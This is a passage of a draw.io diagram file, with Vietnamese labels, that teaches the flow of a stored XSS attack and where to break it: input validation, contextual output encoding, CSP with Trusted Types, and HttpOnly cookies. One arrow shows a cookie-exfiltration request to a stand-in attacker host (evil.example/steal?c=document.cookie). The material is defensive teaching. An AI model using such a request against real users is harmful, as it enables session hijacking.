                </mxCell>
                <mxCell id="m7" value="⑤ GET /page" style="html=1;verticalAlign=bottom;endArrow=block;endFill=1;strokeColor=#333333;fontSize=11;" parent="1" edge="1">
                    <mxGeometry relative="1" as="geometry">
                        <mxPoint x="1200" y="540" as="sourcePoint"/>
                        <mxPoint x="790" y="540" as="targetPoint"/>
                    </mxGeometry>
                </mxCell>
                <mxCell id="m8" value="⑥ SELECT" style="html=1;verticalAlign=bottom;endArrow=block;endFill=1;strokeColor=#333333;fontSize=11;" parent="1" edge="1">
                    <mxGeometry relative="1" as="geometry">
                        <mxPoint x="790" y="585" as="sourcePoint"/>
                        <mxPoint x="995" y="585" as="targetPoint"/>
                    </mxGeometry>
                </mxCell>
                <mxCell id="m9" value="dữ liệu, bên trong có payload" style="html=1;verticalAlign=bottom;endArrow=open;endFill=0;dashed=1;strokeColor=#666666;fontSize=11;" parent="1" edge="1">
                    <mxGeometry relative="1" as="geometry">
                        <mxPoint x="995" y="625" as="sourcePoint"/>
                        <mxPoint x="790" y="625" as="targetPoint"/>
                    </mxGeometry>
                </mxCell>
                <mxCell id="m10" value="⑦ 200 OK — HTML nhúng THẲNG payload, KHÔNG encode  ← LỖI THẬT Ở ĐÂY" style="html=1;verticalAlign=bottom;endArrow=block;endFill=1;strokeColor=#333333;fontSize=11;strokeColor=#b85450;fontColor=#b85450;fontStyle=1;" parent="1" edge="1">
                    <mxGeometry relative="1" as="geometry">
                        <mxPoint x="790" y="672" as="sourcePoint"/>
                        <mxPoint x="1200" y="672" as="targetPoint"/>
                    </mxGeometry>
                </mxCell>
                <mxCell id="fr3" value="Giai đoạn 3 — trình duyệt thực thi và rò rỉ dữ liệu" style="shape=umlFrame;whiteSpace=wrap;html=1;width=300;height=28;fillColor=none;strokeColor=#999999;fontSize=11;fontStyle=2;align=left;verticalAlign=top;" parent="1" vertex="1">
                    <mxGeometry x="40" y="705" width="1420" height="280" as="geometry"/>
                </mxCell>
                <mxCell id="exec" value="&lt;b&gt;⑧ parse HTML → gặp &amp;lt;script&amp;gt; → CHẠY&lt;/b&gt;&lt;br&gt;Trình duyệt không phân biệt được script của bạn với script của kẻ tấn công. Nó chạy trong origin của trang, với mọi quyền mà phiên của nạn nhân đang có." style="rounded=0;whiteSpace=wrap;html=1;fillColor=#e1d5e7;strokeColor=#9673a6;fontSize=11;align=center;" parent="1" vertex="1">
                    <mxGeometry x="1115" y="760" width="170" height="140" as="geometry"/>
                </mxCell>
                <mxCell id="m11" value="⑨ GET https://evil.example/steal?c=document.cookie" style="html=1;verticalAlign=bottom;endArrow=block;endFill=1;strokeColor=#333333;fontSize=11;strokeColor=#b85450;fontColor=#b85450;fontStyle=1;" parent="1" edge="1">
                    <mxGeometry relative="1" as="geometry">
                        <mxPoint x="1200" y="925" as="sourcePoint"/>
                        <mxPoint x="565" y="925" as="targetPoint"/>
                    </mxGeometry>
                </mxCell>
                <mxCell id="m12" value="⑩ phiên của nạn nhân" style="html=1;verticalAlign=bottom;endArrow=open;endFill=0;dashed=1;strokeColor=#666666;fontSize=11;" parent="1" edge="1">
                    <mxGeometry relative="1" as="geometry">
                        <mxPoint x="565" y="965" as="sourcePoint"/>
                        <mxPoint x="135" y="965" as="targetPoint"/>
                    </mxGeometry>
                </mxCell>
                <mxCell id="d1" value="&lt;b&gt;Cắt ở ② — Validate đầu vào theo allowlist&lt;/b&gt;&lt;br&gt;Chỉ nhận đúng kiểu, độ dài, định dạng mong đợi.&lt;br&gt;LƯU Ý: đây KHÔNG phải cách chống XSS, chỉ thu hẹp bề mặt. Payload hợp lệ về mặt định dạng vẫn lọt." style="shape=note;whiteSpace=wrap;html=1;size=14;fillColor=#d5e8d4;strokeColor=#82b366;align=left;verticalAlign=top;spacingLeft=8;spacingTop=2;fontSize=11;" parent="1" vertex="1">
                    <mxGeometry x="1510" y="195" width="650" height="110" as="geometry"/>
                </mxCell>
                <mxCell id="d2" value="&lt;b&gt;Ở ③ — cố tình KHÔNG làm gì&lt;/b&gt;&lt;br&gt;Lưu nguyên văn là ĐÚNG. Sanitize lúc nhập sẽ làm hỏng dữ liệu gốc mà vẫn dính XSS khi cùng chuỗi đó được xuất ra một ngữ cảnh khác (attribute, JS, URL)." style="shape=note;whiteSpace=wrap;html=1;size=14;fillColor=#fff2cc;strokeColor=#d6b656;align=left;verticalAlign=top;spacingLeft=8;spacingTop=2;fontSize=11;" parent="1" vertex="1">
                    <mxGeometry x="1510" y="320" width="650" height="110" as="geometry"/>
                </mxCell>
                <mxCell id="d3" value="&lt;b&gt;Cắt ở ⑦ — Output encoding theo NGỮ CẢNH  ★ fix chính&lt;/b&gt;&lt;br&gt;Mỗi ngữ cảnh một cách encode khác nhau: HTML body · HTML attribute · JavaScript · URL · CSS.&lt;br&gt;Framework hiện đại tự làm khi dùng cơ chế binding chuẩn — và TẮT khi bạn gọi innerHTML, dangerouslySetInnerHTML, bypassSecurityTrustHtml. Mọi chỗ như vậy phải được rà tay." style="shape=note;whiteSpace=wrap;html=1;size=14;fillColor=#d5e8d4;strokeColor=#82b366;align=left;verticalAlign=top;spacingLeft=8;spacingTop=2;fontSize=11;" parent="1" vertex="1">
                    <mxGeometry x="1510" y="445" width="650" height="150" as="geometry"/>
                </mxCell>
                <mxCell id="d4" value="&lt;b&gt;Cắt ở ⑧ — Content-Security-Policy + Trusted Types&lt;/b&gt;&lt;br&gt;script-src 'self' (KHÔNG có 'unsafe-inline'), tốt hơn nữa là nonce hoặc hash ⇒ inline script không chạy.&lt;br&gt;Trusted Types chặn việc ghi chuỗi thô vào các DOM sink. Đây là phòng thủ chiều sâu, KHÔNG thay thế cho ⑦." style="shape=note;whiteSpace=wrap;html=1;size=14;fillColor=#d5e8d4;strokeColor=#82b366;align=left;verticalAlign=top;spacingLeft=8;spacingTop=2;fontSize=11;" parent="1" vertex="1">
                    <mxGeometry x="1510" y="610" width="650" height="140" as="geometry"/>
                </mxCell>
                <mxCell id="d5" value="&lt;b&gt;Cắt ở ⑨ — chặn đường rò rỉ&lt;/b&gt;&lt;br&gt;Cookie HttpOnly ⇒ document.cookie không đọc được.&lt;br&gt;CSP connect-src / img-src / form-action ⇒ giới hạn nơi dữ liệu được gửi tới." style="shape=note;whiteSpace=wrap;html=1;size=14;fillColor=#d5e8d4;strokeColor=#82b366;align=left;verticalAlign=top;spacingLeft=8;spacingTop=2;fontSize=11;" parent="1" vertex="1">
                    <mxGeometry x="1510" y="765" width="650" height="110" as="geometry"/>
                </mxCell>
                <mxCell id="d6" value="&lt;b&gt;Cảnh báo: HttpOnly KHÔNG chấm dứt XSS&lt;/b&gt;&lt;br&gt;Script vẫn gửi request THAY MẶT nạn nhân — trình duyệt tự đính kèm cookie. Kẻ tấn công không đọc được cookie nhưng vẫn đổi mật khẩu, chuyển tiền, đọc dữ liệu qua chính API của bạn.&lt;br&gt;Giảm thiệt hại thêm: SameSite, phiên ngắn, xác nhận lại cho thao tác nhạy cảm." style="shape=note;whiteSpace=wrap;html=1;size=14;fillColor=#f8cecc;strokeColor=#b85450;align=left;verticalAlign=top;spacingLeft=8;spacingTop=2;fontSize=11;" parent="1" vertex="1">
                    <mxGeometry x="1510" y="890" width="650" height="140" as="geometry"/>
                </mxCell>
            </root>
        </mxGraphModel>
    </diagram>
</mxfile>
